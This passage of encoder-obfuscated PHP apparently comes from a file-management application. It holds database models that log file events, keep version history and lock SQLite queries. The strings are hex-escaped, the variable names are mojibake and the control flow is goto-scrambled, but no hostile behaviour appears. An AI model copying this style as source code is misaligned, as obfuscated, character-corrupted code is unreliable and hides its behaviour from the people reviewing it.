$Aµƒøƒ’ =& $_SERVER[”Ì÷ñ­î¸]; switch ($this->dbType) { case $Aµƒøƒ’[858]: case $Aµƒøƒ’[850]: case $Aµƒøƒ’[831]: case $Aµƒøƒ’[849]: case $Aµƒøƒ’[833]: case $Aµƒøƒ’[861]: return $this->_linkID->lastInsertId(); case $Aµƒøƒ’[832]: case $Aµƒøƒ’[834]: $e¶›…¬¯ªÅ = $this->table; $BéÊá™à¦” = $this->query("\123\105\114\x45\103\x54\x20{$e¶›…¬¯ªÅ}\56\143\x75\162\162\x76\x61\154\x20\x63\165\x72\162\x76\x61\x6c\x20\106\122\x4f\115\40\x64\165\x61\x6c"); return $BéÊá™à¦” ? $BéÊá™à¦”[0][$Aµƒøƒ’[873]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($e„…é§ˆå) { goto Bîµ½ÅŠÄÁ; E¨½Œè“½Ÿ: fclose($eÖƒâ…©Ğ—); show_json($Cß’¡ Ì¾Ê[876], !1); return !1; goto d¾Ê¸¢òÃ¹; Bîµ½ÅŠÄÁ: $Cß’¡ Ì¾Ê =& $_SERVER[”Ì÷ñ­î¸]; $dâ“»® = DATA_PATH . $Cß’¡ Ì¾Ê[874]; $eÖƒâ…©Ğ— = fopen($dâ“»®, $Cß’¡ Ì¾Ê[875]); goto C²»Ç©´´¯; C²»Ç©´´¯: if (!$eÖƒâ…©Ğ—) { return !1; } if (flock($eÖƒâ…©Ğ—, LOCK_EX)) { $eì¦Š‹ğŸ = parent::query($e„…é§ˆå); flock($eÖƒâ…©Ğ—, LOCK_UN); fclose($eÖƒâ…©Ğ—); return $eì¦Š‹ğŸ; } flock($eÖƒâ…©Ğ—, LOCK_UN); goto E¨½Œè“½Ÿ; d¾Ê¸¢òÃ¹: } public function execute($Fà›Í×ñÏˆ) { goto aë²ÖŸ‡¦; aë²ÖŸ‡¦: $Cñ‚ÔªäŠ =& $_SERVER[”Ì÷ñ­î¸]; $c¢œù ³Ò = DATA_PATH . $Cñ‚ÔªäŠ[874]; $cğºá‡ë–ƒ = fopen($c¢œù ³Ò, $Cñ‚ÔªäŠ[875]); goto b„ñÚãª÷; b„ñÚãª÷: if (!$cğºá‡ë–ƒ) { return !1; } if (flock($cğºá‡ë–ƒ, LOCK_EX)) { $fÎç¤´©ö = parent::execute($Fà›Í×ñÏˆ); flock($cğºá‡ë–ƒ, LOCK_UN); fclose($cğºá‡ë–ƒ); return $fÎç¤´©ö; } flock($cğºá‡ë–ƒ, LOCK_UN); goto a„œ©¸¯Ò; a„œ©¸¯Ò: fclose($cğºá‡ë–ƒ); show_json($Cñ‚ÔªäŠ[876], !1); return !1; goto dŸšğÒå¡; dŸšğÒå¡: } } goto bª¦¦Ú“¶; c§Ü‚Úˆœ–: class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\x75\162\x63\145\137\145\x76\145\156\164"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\x54\x69\155\145", "\x74\151\155\x65", "\x69\156\x73\x65\x72\x74", "\x66\x75\x6e\x63\x74\151\x6f\x6e"), array("\x64\x65\163\143", '', "\x69\x6e\163\x65\x72\164\54\165\160\x64\141\164\x65\54\163\x65\x6c\145\143\x74", "\152\163\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($D®¿®ˆ“ó, $aÒÇâßñ³Ù, $D÷¼¡¹©—‚ = '') { goto fòÀßÇĞæ±; e¢à‰¾÷ß: if (!$E…‡é±Ï©Õ) { return !1; } if ($this->isCacheEvent($E…‡é±Ï©Õ, $aÒÇâßñ³Ù)) { return; } if ($D÷¼¡¹©—‚ && is_string($D÷¼¡¹©—‚)) { $D÷¼¡¹©—‚ = array($a‘ø£Š„[2136] => $D÷¼¡¹©—‚); } goto f…Ñ¬ª°ÃŠ; f…Ñ¬ª°ÃŠ: $Fâ…ÌéÄ  = array($a‘ø£Š„[383] => $D®¿®ˆ“ó, $a‘ø£Š„[2281] => $E…‡é±Ï©Õ[$a‘ø£Š„[461]], $a‘ø£Š„[2282] => $E…‡é±Ï©Õ[$a‘ø£Š„[28]], $a‘ø£Š„[466] => $E…‡é±Ï©Õ[$a‘ø£Š„[466]], $a‘ø£Š„[1430] => USER_ID, $a‘ø£Š„[388] => $aÒÇâßñ³Ù, $a‘ø£Š„[1432] => $D÷¼¡¹©—‚); $this->addSystemLog($aÒÇâßñ³Ù, $Fâ…ÌéÄ ); return $this->add($Fâ…ÌéÄ ); goto C†——à¶–Ñ; fòÀßÇĞæ±: $a‘ø£Š„ =& $_SERVER[”Ì÷ñ­î¸]; if (!$this->eventSave) { return; } $E…‡é±Ï©Õ = Model($a‘ø£Š„[1117])->sourceInfo($D®¿®ˆ“ó); goto e¢à‰¾÷ß; C†——à¶–Ñ: } private function addSystemLog($fÔ„ÖÍŒÆÒ, $Cğ—º•‚âÊ) { $b¯‚¬ğ‹» =& $_SERVER[”Ì÷ñ­î¸]; if ($fÔ„ÖÍŒÆÒ == $b¯‚¬ğ‹»[2283]) { $fÔ„ÖÍŒÆÒ = $Cğ—º•‚âÊ[$b¯‚¬ğ‹»[405]][$b¯‚¬ğ‹»[2284]]; } else { if (in_array($fÔ„ÖÍŒÆÒ, array($b¯‚¬ğ‹»[2083], $b¯‚¬ğ‹»[2285]))) { $fÔ„ÖÍŒÆÒ = $Cğ—º•‚âÊ[$b¯‚¬ğ‹»[405]][$b¯‚¬ğ‹»[693]]; } } $bÍ¯ĞÎ¹‡ = array_merge($Cğ—º•‚âÊ, array($b¯‚¬ğ‹»[2286] => $Cğ—º•‚âÊ[$b¯‚¬ğ‹»[369]], $b¯‚¬ğ‹»[2287] => $Cğ—º•‚âÊ[$b¯‚¬ğ‹»[2287]])); Model($b¯‚¬ğ‹»[2047])->addLog($b¯‚¬ğ‹»[2288] . $fÔ„ÖÍŒÆÒ, $bÍ¯ĞÎ¹‡); } private function isCacheEvent($E¦ùù—ŸšÕ, $EÊ‘å •ÔÚ) { if ($E¦ùù—ŸšÕ[$_SERVER[”Ì÷ñ­î¸][371]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($d ©Ğ¨Ùà, $B‚ÕÂ™¨’Ê) { $c†›¹ßíô =& $_SERVER[”Ì÷ñ­î¸]; $d…¾Ë‚¢Éù = Model($c†›¹ßíô[1117])->sourceInfo($d ©Ğ¨Ùà); $AÖ–ÍŠÂƒØ = array($c†›¹ßíô[2284] => $B‚ÕÂ™¨’Ê, $c†›¹ßíô[28] => $d…¾Ë‚¢Éù[$c†›¹ßíô[28]]); return $this->addEvent($d ©Ğ¨Ùà, $c†›¹ßíô[2283], $AÖ–ÍŠÂƒØ); } public function eventFileEdit($Dâ²ïØÑ«) { $fĞ›Óàâ’ =& $_SERVER[”Ì÷ñ­î¸]; $Añºóöİì = array($fĞ›Óàâ’[2289] => $_SERVER[$fĞ›Óàâ’[2290]], $fĞ›Óàâ’[1753] => strtolower(ACTION)); return $this->addEvent($Dâ²ïØÑ«, $fĞ›Óàâ’[2074], $Añºóöİì); } public function eventRecycle($e¯‡‹ëí³…, $cÈùëóÍ„¬) { return $this->addEvent($e¯‡‹ëí³…, $_SERVER[”Ì÷ñ­î¸][2285], $cÈùëóÍ„¬); } public function eventRemove($Bƒ«„‰”¤) { $e”ÌŒßÉïŒ =& $_SERVER[”Ì÷ñ­î¸]; $A›í¨³‹¶Å = Model($e”ÌŒßÉïŒ[1117])->sourceInfo($Bƒ«„‰”¤); $d´©ÎåÃ = $A›í¨³‹¶Å[$e”ÌŒßÉïŒ[28]]; return $this->addEvent($A›í¨³‹¶Å[$e”ÌŒßÉïŒ[461]], $e”ÌŒßÉïŒ[2073], $d´©ÎåÃ); } public function eventShare($bÓÈ“Ÿ¸í, $fí¦£©®¦) { return $this->addEvent($bÓÈ“Ÿ¸í, $_SERVER[”Ì÷ñ­î¸][2083], $fí¦£©®¦); } public function eventMove($Cß©‹ã´æ», $aÅÚ¦Ÿà¸Õ, $bƒ¸İÓŞòÃ) { goto eŞ­‡«“«È; aä‚ÀÚ¸¾Ñ: $E§¿“Ö½Ò· = $B‡Ç×ˆ‡£Ò->sourceInfo($aÅÚ¦Ÿà¸Õ); $A…‚ÏÔÛ›Ü = $B‡Ç×ˆ‡£Ò->sourceInfo($bƒ¸İÓŞòÃ); $EóÌá¬×‹¾ = array($e¯–ó¬[1006] => $aÅÚ¦Ÿà¸Õ, $e¯–ó¬[2291] => $E§¿“Ö½Ò·[$e¯–ó¬[28]], $e¯–ó¬[2292] => $E§¿“Ö½Ò·[$e¯–ó¬[466]], $e¯–ó¬[1007] => $bƒ¸İÓŞòÃ, $e¯–ó¬[2293] => $A…‚ÏÔÛ›Ü[$e¯–ó¬[28]], $e¯–ó¬[2294] => $A…‚ÏÔÛ›Ü[$e¯–ó¬[466]]); goto EÆ¢ƒîé›¬; EÆ¢ƒîé›¬: $this->addEvent($Cß©‹ã´æ», $e¯–ó¬[492], $EóÌá¬×‹¾); $a™ÇÚ¬«Ğ¿ = $B‡Ç×ˆ‡£Ò->sourceInfo($Cß©‹ã´æ»); $EóÌá¬×‹¾ = array($e¯–ó¬[369] => $a™ÇÚ¬«Ğ¿[$e¯–ó¬[369]], $e¯–ó¬[28] => $a™ÇÚ¬«Ğ¿[$e¯–ó¬[28]]); goto BëÎ˜›Ùœ‘; BëÎ˜›Ùœ‘: $this->addEvent($aÅÚ¦Ÿà¸Õ, $e¯–ó¬[2295], $EóÌá¬×‹¾); goto c¸Ü¡Á¶¾; eŞ­‡«“«È: $e¯–ó¬ =& $_SERVER[”Ì÷ñ­î¸]; $B‡Ç×ˆ‡£Ò = Model($e¯–ó¬[1117]); $a™ÇÚ¬«Ğ¿ = $B‡Ç×ˆ‡£Ò->sourceInfo($Cß©‹ã´æ»); goto aä‚ÀÚ¸¾Ñ; c¸Ü¡Á¶¾: } public function eventCopy($BœäÓÊ·ó®) { $this->eventCreate($BœäÓÊ·ó®, $_SERVER[”Ì÷ñ­î¸][490]); } public function eventRename($c‹¦¦ÍŞ±, $D¹êŒ¡¬¿, $C‰¨ÙÔØØ›) { $E¼á“¸Ê™¶ =& $_SERVER[”Ì÷ñ­î¸]; $eÊ¾”«Ãá× = array($E¼á“¸Ê™¶[1006] => $D¹êŒ¡¬¿, $E¼á“¸Ê™¶[1007] => $C‰¨ÙÔØØ›); return $this->addEvent($c‹¦¦ÍŞ±, $E¼á“¸Ê™¶[1129], $eÊ¾”«Ãá×); } public function eventAddComment($bßÂöİŒ­î, $Dê‰°­‡†­) { return $this->addEvent($bßÂöİŒ­î, $_SERVER[”Ì÷ñ­î¸][2296], $Dê‰°­‡†­); } public function eventAddDesc($FÀÉ“¶ŞÂ, $eÖÌ´Ù˜°©) { return $this->addEvent($FÀÉ“¶ŞÂ, $_SERVER[”Ì÷ñ­î¸][2297], $eÖÌ´Ù˜°©); } public function listBySource($d‹ºèèè¸ê) { goto D¹ŒºÀªí; D¹ŒºÀªí: $CŠ®ô¾èê  =& $_SERVER[”Ì÷ñ­î¸]; $dÔŠ»…‰±‹ = Model($CŠ®ô¾èê [1117])->sourceInfo($d‹ºèèè¸ê); $d¹…Î¼§ä = array($CŠ®ô¾èê [383] => $d‹ºèèè¸ê); goto Cåè’“‹Ë; FÛ¶„¿±¦œ: $e²Õ³îÖ  = $this->eventListParse($e²Õ³îÖ , $d‹ºèèè¸ê); show_json($e²Õ³îÖ ); goto cİÛÅ’á¢î; Cåè’“‹Ë: if ($dÔŠ»…‰±‹[$CŠ®ô¾èê [370]] == $CŠ®ô¾èê [83]) { $D¡±é’â¨ƒ = Model($CŠ®ô¾èê [1117])->listSearchChildren($d‹ºèèè¸ê, 20000); $D¡±é’â¨ƒ[] = $d‹ºèèè¸ê . $CŠ®ô¾èê [361]; $d¹…Î¼§ä = array($CŠ®ô¾èê [369] => array($CŠ®ô¾èê [7], $D¡±é’â¨ƒ)); } $e²Õ³îÖ  = $this->where($d¹…Î¼§ä)->order($CŠ®ô¾èê [2298])->selectPage(); if ($e²Õ³îÖ [$CŠ®ô¾èê [351]][$CŠ®ô¾èê [352]] == 0) { $e²Õ³îÖ [$CŠ®ô¾èê [351]][$CŠ®ô¾èê [352]] = 1; $e²Õ³îÖ [$CŠ®ô¾èê [354]] = array(array($CŠ®ô¾èê [383] => $d‹ºèèè¸ê, $CŠ®ô¾èê [2281] => $dÔŠ»…‰±‹[$CŠ®ô¾èê [461]], $CŠ®ô¾èê [1430] => $dÔŠ»…‰±‹[$CŠ®ô¾èê [378]], $CŠ®ô¾èê [388] => $CŠ®ô¾èê [2299], $CŠ®ô¾èê [389] => $dÔŠ»…‰±‹[$CŠ®ô¾èê [187]], $CŠ®ô¾èê [1432] => $CŠ®ô¾èê [33])); } goto FÛ¶„¿±¦œ; cİÛÅ’á¢î: } private function eventListParse($aÌ®„ÓäÒØ, $D¾ø© „‚Ó) { goto aô’îì×‘ğ; FÙâÕ½íï: $BƒäİƒÚÇª = array_unique($BƒäİƒÚÇª); $F‰ƒÌÎ÷– = array_unique(array_to_keyvalue($aˆˆ‘Ì‚ë, $e‘Ù±À¬­©[33], $e‘Ù±À¬­©[1439])); $bÅÅ¹áÚ–ß = Model($e‘Ù±À¬­©[477])->userListInfo($F‰ƒÌÎ÷–); goto DÉ­ÌäÎ; F¾Ö ‚°Û‹: return $aÌ®„ÓäÒØ; goto EËƒ‚»ˆìÊ; cÔ«…ÂÜ™: $Bì»‰¿¼ß’ = array_to_keyvalue($aˆˆ‘Ì‚ë, $e‘Ù±À¬­©[33], $e‘Ù±À¬­©[2287]); foreach ($aˆˆ‘Ì‚ë as $fÑºŠ²èàÖ) { $fâ»É‘¯‚× = $fÑºŠ²èàÖ[$e‘Ù±À¬­©[405]]; if ($fÑºŠ²èàÖ[$e‘Ù±À¬­©[29]] == $e‘Ù±À¬­©[492] && isset($fâ»É‘¯‚×[$e‘Ù±À¬­©[1006]])) { $BƒäİƒÚÇª[] = $fâ»É‘¯‚×[$e‘Ù±À¬­©[1006]] . $e‘Ù±À¬­©[33]; $BƒäİƒÚÇª[] = $fâ»É‘¯‚×[$e‘Ù±À¬­©[1007]] . $e‘Ù±À¬­©[33]; } if ($fÑºŠ²èàÖ[$e‘Ù±À¬­©[29]] == $e‘Ù±À¬­©[2295] && isset($fâ»É‘¯‚×[$e‘Ù±À¬­©[369]])) { $BƒäİƒÚÇª[] = $fâ»É‘¯‚×[$e‘Ù±À¬­©[369]] . $e‘Ù±À¬­©[33]; } } $BƒäİƒÚÇª = array_merge($BƒäİƒÚÇª, $Bì»‰¿¼ß’, array($D¾ø© „‚Ó . $e‘Ù±À¬­©[33])); goto FÙâÕ½íï; aô’îì×‘ğ: $e‘Ù±À¬­© =& $_SERVER[”Ì÷ñ­î¸]; $aˆˆ‘Ì‚ë = $aÌ®„ÓäÒØ[$e‘Ù±À¬­©[354]]; $BƒäİƒÚÇª = array_to_keyvalue($aˆˆ‘Ì‚ë, $e‘Ù±À¬­©[33], $e‘Ù±À¬­©[369]); goto cÔ«…ÂÜ™; DÉ­ÌäÎ: $dˆæ¬½ ©Û = Model($e‘Ù±À¬­©[754])->sourceListInfo($BƒäİƒÚÇª, !0); foreach ($aˆˆ‘Ì‚ë as &$fÑºŠ²èàÖ) { if ($fÑºŠ²èàÖ[$e‘Ù±À¬­©[29]] == $e‘Ù±À¬­©[492] && isset($fÑºŠ²èàÖ[$e‘Ù±À¬­©[405]][$e‘Ù±À¬­©[1006]])) { $fÑºŠ²èàÖ[$e‘Ù±À¬­©[405]][$e‘Ù±À¬­©[1006]] = $dˆæ¬½ ©Û[$fÑºŠ²èàÖ[$e‘Ù±À¬­©[405]][$e‘Ù±À¬­©[1006]]]; $fÑºŠ²èàÖ[$e‘Ù±À¬­©[405]][$e‘Ù±À¬­©[1007]] = $dˆæ¬½ ©Û[$fÑºŠ²èàÖ[$e‘Ù±À¬­©[405]][$e‘Ù±À¬­©[1007]]]; } if ($fÑºŠ²èàÖ[$e‘Ù±À¬­©[29]] == $e‘Ù±À¬­©[2295] && isset($fÑºŠ²èàÖ[$e‘Ù±À¬­©[405]][$e‘Ù±À¬­©[369]])) { $fÑºŠ²èàÖ[$e‘Ù±À¬­©[405]][$e‘Ù±À¬­©[369]] = $dˆæ¬½ ©Û[$fÑºŠ²èàÖ[$e‘Ù±À¬­©[405]][$e‘Ù±À¬­©[369]]]; } $fÑºŠ²èàÖ[$e‘Ù±À¬­©[391]] = $dˆæ¬½ ©Û[$fÑºŠ²èàÖ[$e‘Ù±À¬­©[369]]]; $fÑºŠ²èàÖ[$e‘Ù±À¬­©[2300]] = $dˆæ¬½ ©Û[$fÑºŠ²èàÖ[$e‘Ù±À¬­©[2287]]]; if ($fÑºŠ²èàÖ[$e‘Ù±À¬­©[29]] == $e‘Ù±À¬­©[2073]) { $fÑºŠ²èàÖ[$e‘Ù±À¬­©[2300]] = $fÑºŠ²èàÖ[$e‘Ù±À¬­©[391]]; $fÑºŠ²èàÖ[$e‘Ù±À¬­©[2287]] = $fÑºŠ²èàÖ[$e‘Ù±À¬­©[2300]][$e‘Ù±À¬­©[369]]; $fÑºŠ²èàÖ[$e‘Ù±À¬­©[391]] = !1; $fÑºŠ²èàÖ[$e‘Ù±À¬­©[369]] = $e‘Ù±À¬­©[33]; } $fÑºŠ²èàÖ[$e‘Ù±À¬­©[2243]] = $bÅÅ¹áÚ–ß[$fÑºŠ²èàÖ[$e‘Ù±À¬­©[1439]]]; } $aÌ®„ÓäÒØ[$e‘Ù±À¬­©[354]] = $aˆˆ‘Ì‚ë; goto F¾Ö ‚°Û‹; EËƒ‚»ˆìÊ: } public function removeBySource($AÔŠùµêÁÒ) { $b¼êŞŞØ = array($_SERVER[”Ì÷ñ­î¸][383] => $AÔŠùµêÁÒ); $this->where($b¼êŞŞØ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\165\x72\x63\x65\137\x68\151\x73\x74\x6f\162\x79"; public function addHistory($Aƒ¨Ëº“¡¾, $eÆ¬›ƒÈŸà = '') { $AŠ¯…÷Ä“İ =& $_SERVER[”Ì÷ñ­î¸]; $cÌ›º‰ìËÇ = array($AŠ¯…÷Ä“İ[383] => $Aƒ¨Ëº“¡¾[$AŠ¯…÷Ä“İ[369]], $AŠ¯…÷Ä“İ[1430] => isset($Aƒ¨Ëº“¡¾[$AŠ¯…÷Ä“İ[379]]) ? $Aƒ¨Ëº“¡¾[$AŠ¯…÷Ä“İ[379]] : $Aƒ¨Ëº“¡¾[$AŠ¯…÷Ä“İ[378]], $AŠ¯…÷Ä“İ[420] => $Aƒ¨Ëº“¡¾[$AŠ¯…÷Ä“İ[419]], $AŠ¯…÷Ä“İ[520] => $Aƒ¨Ëº“¡¾[$AŠ¯…÷Ä“İ[77]], $AŠ¯…÷Ä“İ[2301] => $eÆ¬›ƒÈŸà); $bæ½¶–²Ó× = $GLOBALS[$AŠ¯…÷Ä“İ[6]][$AŠ¯…÷Ä“İ[84]][$AŠ¯…÷Ä“İ[2302]]; if ($bæ½¶–²Ó× > 1) { $this->historyAutoClear($cÌ›º‰ìËÇ[$AŠ¯…÷Ä“İ[369]]); $this->add($cÌ›º‰ìËÇ); } Model($AŠ¯…÷Ä“İ[2303])->eventFileEdit($Aƒ¨Ëº“¡¾[$AŠ¯…÷Ä“İ[369]]); } private function historyAutoClear($e•Ş™³é¦ˆ) { goto E¸«ëö³Ğç; fËäŒïŸì: if ($Eæï…Ü©„ >= 500) { return; } $D¾öÏØãó» = array($eì£¢’Ò›«[383] => $e•Ş™³é¦ˆ); $E®¤Şè©© = $this->field($eì£¢’Ò›«[2306])->where($D¾öÏØãó»)->order($eì£¢’Ò›«[2298])->select(); goto cªÍ•Á‘¾; d„ùµÓãâ: $DÒÖİÓİÚ‘ = $CºŞ™Üó‘ù == $eì£¢’Ò›«[2305] ? 3 : $A¨­õ‹Ã‡; if ($A¨­õ‹Ã‡ <= 1) { $DÒÖİÓİÚ‘ = 1; } $Eæï…Ü©„ = $DÒÖİÓİÚ‘ - 1; goto fËäŒïŸì; cªÍ•Á‘¾: if (!$E®¤Şè©© || $Eæï…Ü©„ >= count($E®¤Şè©©)) { return; } $a–é÷Ó†ĞŞ = array_to_keyvalue($E®¤Şè©©, $eì£¢’Ò›«[33], $eì£¢’Ò›«[367]); $a–é÷Ó†ĞŞ = array_slice($a–é÷Ó†ĞŞ, $Eæï…Ü©„); goto e§­³Ó¢—†; e§­³Ó¢—†: $d§¬Ã¦›—ª = array_to_keyvalue($E®¤Şè©©, $eì£¢’Ò›«[33], $eì£¢’Ò›«[419]); $d§¬Ã¦›—ª = array_slice($d§¬Ã¦›—ª, $Eæï…Ü©„); if (!$a–é÷Ó†ĞŞ || !$d§¬Ã¦›—ª) { return; } goto açå˜Õêö; E¸«ëö³Ğç: $eì£¢’Ò›« =& $_SERVER[”Ì÷ñ­î¸]; $CºŞ™Üó‘ù = Model($eì£¢’Ò›«[1088])->get($eì£¢’Ò›«[2304]); $A¨­õ‹Ã‡ = $GLOBALS[$eì£¢’Ò›«[6]][$eì£¢’Ò›«[84]][$eì£¢’Ò›«[2302]]; goto d„ùµÓãâ; açå˜Õêö: $D¾öÏØãó» = array($eì£¢’Ò›«[385] => array($eì£¢’Ò›«[7], $a–é÷Ó†ĞŞ)); $this->where($D¾öÏØãó»)->delete(); Model($eì£¢’Ò›«[422])->remove($d§¬Ã¦›—ª); goto D®¨†„¢Ôƒ; D®¨†„¢Ôƒ: } public function listData($eƒ°ÑÆçæ‹) { goto d§á§İ—ë; d§á§İ—ë: $Bìƒ£‰’Äï =& $_SERVER[”Ì÷ñ­î¸]; $d¥¡¨¨õÖ = array($Bìƒ£‰’Äï[383] => $eƒ°ÑÆçæ‹); $b¤Áğˆ¢ƒ = $Bìƒ£‰’Äï[2307]; goto cÑãóÅ’ù‚; fŠ£¨Á•ÍÄ: $bÆ™ÏÜ‡„õ = 3; if ($F‹â¨Å„Àê == $Bìƒ£‰’Äï[2305]) { $aµ¬Š¨ï„[$Bìƒ£‰’Äï[354]] = array_slice($aµ¬Š¨ï„[$Bìƒ£‰’Äï[354]], 0, $bÆ™ÏÜ‡„õ); $aµ¬Š¨ï„[$Bìƒ£‰’Äï[351]] = array($Bìƒ£‰’Äï[2308] => 1, $Bìƒ£‰’Äï[2309] => 20, $Bìƒ£‰’Äï[2310] => 1, $Bìƒ£‰’Äï[2311] => count($aµ¬Š¨ï„[$Bìƒ£‰’Äï[354]])); } return $aµ¬Š¨ï„; goto D¶§Ì÷œÁ; cÑãóÅ’ù‚: $aµ¬Š¨ï„ = $this->field($b¤Áğˆ¢ƒ)->where($d¥¡¨¨õÖ)->order($Bìƒ£‰’Äï[2298])->selectPage(); $this->_listAppendUser($aµ¬Š¨ï„[$Bìƒ£‰’Äï[354]]); $F‹â¨Å„Àê = Model($Bìƒ£‰’Äï[1088])->get($Bìƒ£‰’Äï[2304]); goto fŠ£¨Á•ÍÄ; D¶§Ì÷œÁ: } protected function _listAppendUser(&$A¦…ºÙ­²ë) { $bòƒ‡Òá›¢ =& $_SERVER[”Ì÷ñ­î¸]; $BñÁ¥¯ôôğ = array_to_keyvalue($A¦…ºÙ­²ë, $bòƒ‡Òá›¢[33], $bòƒ‡Òá›¢[1439]); $CÚ›×ø–ñ = Model($bòƒ‡Òá›¢[477])->userListInfo($BñÁ¥¯ôôğ); foreach ($A¦…ºÙ­²ë as &$FÊ™‚ŠéÖ) { $a±ìÕØ·Ä® = $FÊ™‚ŠéÖ[$bòƒ‡Òá›¢[1439]]; $FÊ™‚ŠéÖ[$bòƒ‡Òá›¢[378]] = $CÚ›×ø–ñ[$a±ìÕØ·Ä®] ? $CÚ›×ø–ñ[$a±ìÕØ·Ä®] : !1; } } public function fileInfo($AÖİŒƒ‚¦) { $FÜã™Ê¿Á– =& $_SERVER[”Ì÷ñ­î¸]; $B±Å®Ê‹“Œ = $this->tablePrefix; $CùáëÚ¶¿ = "{$B±Å®Ê‹“Œ}\151\157\137\146\x69\154\x65\40\x66\x69\154\x65\x73\x20\157\x6e\x20\x66\x69\154\145\x73\x2e\146\x69\154\145\x49\x44\x20\x3d\40\x68\x69\163\164\157\x72\171\x2e\x66\151\x6c\x65\111\x44"; return $this->alias($FÜã™Ê¿Á–[2312])->where(array($FÜã™Ê¿Á–[385] => $AÖİŒƒ‚¦))->join($CùáëÚ¶¿, $FÜã™Ê¿Á–[2313])->find(); } public function removeItem($eœŸ‹Â¥¿Ù) { $bªõƒ¤‹ =& $_SERVER[”Ì÷ñ­î¸]; $Fµ¥ø¤î = array($bªõƒ¤‹[385] => $eœŸ‹Â¥¿Ù); $BÊŒÖ÷íŒ = $this->where($Fµ¥ø¤î)->find(); if ($BÊŒÖ÷íŒ) { $fÃ¾ªÇ¨² = $this->where($Fµ¥ø¤î)->delete(); Model($bªõƒ¤‹[422])->remove($BÊŒÖ÷íŒ[$bªõƒ¤‹[419]]); return $fÃ¾ªÇ¨²; } return !1; } public function removeBySource($dÕÊ¦»×ÁŒ) { goto BÚÛ–áÚ¾Š; eÈÑøêî‘«: $C—÷Ğ¶«¨ = array($C¼®…ŒàßÌ[383] => array($C¼®…ŒàßÌ[7], $dÕÊ¦»×ÁŒ)); $d…ÁªŸÓ± = $this->field($C¼®…ŒàßÌ[420])->where($C—÷Ğ¶«¨)->select(); if ($d…ÁªŸÓ±) { $this->where($C—÷Ğ¶«¨)->delete(); $DñÀùÉè¢Ò = array_to_keyvalue($d…ÁªŸÓ±, $C¼®…ŒàßÌ[33], $C¼®…ŒàßÌ[419]); Model($C¼®…ŒàßÌ[422])->remove($DñÀùÉè¢Ò); } goto cÒ×¾•‘åå; cÒ×¾•‘åå: return !0; goto eÍÖŞÄ¤†; BÚÛ–áÚ¾Š: $C¼®…ŒàßÌ =& $_SERVER[”Ì÷ñ­î¸]; if (!$dÕÊ¦»×ÁŒ) { return !1; } if (!is_array($dÕÊ¦»×ÁŒ)) { $dÕÊ¦»×ÁŒ = array($dÕÊ¦»×ÁŒ); } goto eÈÑøêî‘«; eÍÖŞÄ¤†: } public function setDetail($DğáˆŠõ, $cæ¡Åáª„) { $DáÑ©£Ş£ =& $_SERVER[”Ì÷ñ­î¸]; return $this->where(array($DáÑ©£Ş£[385] => $DğáˆŠõ))->save(array($DáÑ©£Ş£[2301] => $cæ¡Åáª„)); } public function rollbackToItem($Aäí°ó…Ãº, $D™××­¥êè) { goto B¥à‚œïÔ“; a÷Ù»Š£ÓÇ: $DİºÂ¾ƒ“ƒ = $this->find($D™××­¥êè); $cƒôœ‹®Ú¤ = array($a–œ°©¬[419] => $DİºÂ¾ƒ“ƒ[$a–œ°©¬[419]], $a–œ°©¬[77] => $DİºÂ¾ƒ“ƒ[$a–œ°©¬[77]], $a–œ°©¬[107] => time(), $a–œ°©¬[379] => USER_ID); Model($a–œ°©¬[754])->where(array($a–œ°©¬[369] => $Aäí°ó…Ãº))->save($cƒôœ‹®Ú¤); goto a¬ğ‘È—•´; B¥à‚œïÔ“: $a–œ°©¬ =& $_SERVER[”Ì÷ñ­î¸]; $e•Áíõ£Ö = Model($a–œ°©¬[754])->sourceInfo($Aäí°ó…Ãº); $this->addHistory($e•Áíõ£Ö); goto a÷Ù»Š£ÓÇ; a¬ğ‘È—•´: return $this->where(array($a–œ°©¬[385] => $D™××­¥êè))->delete(); goto B¸ô†õ –‰; B¸ô†õ –‰: } public function clearSame($dØ¾ßÇõŠ‹) { goto a¶™¯Œôåœ; a¶™¯Œôåœ: $C²•› ŒÆ¸ =& $_SERVER[”Ì÷ñ­î¸]; $F­¤—‡ÚİÛ = $this->listData($dØ¾ßÇõŠ‹); $FÅÃæ§½Œ‡ = array_to_keyvalue_group($F­¤—‡ÚİÛ, $C²•› ŒÆ¸[419]); goto E´ë‚¾ÊÆŒ; E´ë‚¾ÊÆŒ: $Aä÷Ÿ‹’‡ = array(); $CŠ›ˆí ‹… = array(); foreach ($FÅÃæ§½Œ‡ as $a¹Ë°¢ æ) { if (!$a¹Ë°¢ æ || count($a¹Ë°¢ æ) <= 1) { continue; } foreach ($a¹Ë°¢ æ as $A§ï¶†Ãš) { $Aä÷Ÿ‹’‡[] = $A§ï¶†Ãš[$C²•› ŒÆ¸[419]]; $CŠ›ˆí ‹…[] = $A§ï¶†Ãš[$C²•› ŒÆ¸[367]]; } } goto EÄ¸ƒ„·ì½; EÄ¸ƒ„·ì½: if (!$CŠ›ˆí ‹…) { return; } $this->where(array($C²•› ŒÆ¸[367] => array($C²•› ŒÆ¸[7], $CŠ›ˆí ‹…)))->delete(); Model($C²•› ŒÆ¸[422])->remove($Aä÷Ÿ‹’‡); goto E¸ƒ §İÛ¤; E¸ƒ §İÛ¤: } public function userSpace() { $c±ÖÓ«Á¨ƒ =& $_SERVER[”Ì÷ñ­î¸]; $EºÊİª¹§£ = $this->tablePrefix; $f°¢ù«è“¤ = array($c±ÖÓ«Á¨ƒ[1430] => USER_ID); $E˜Ñé•‡¿œ = "{$EºÊİª¹§£}\x69\x6f\137\x66\x69\x6c\145\x20\146\x69\x6c\x65\163\x20\x6f\156\40\146\151\x6c\x65\x73\x2e\x66\x69\154\145\x49\104\x20\75\40\150\151\x73\164\157\162\x79\56\x66\x69\154\145\x49\104"; return $this->alias($c±ÖÓ«Á¨ƒ[2312])->where($f°¢ù«è“¤)->join($E˜Ñé•‡¿œ, $c±ÖÓ«Á¨ƒ[2313])->sum($c±ÖÓ«Á¨ƒ[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($eŒí¤²ß²Å) { goto C†êœ“é; aÅµáŠÊ: if 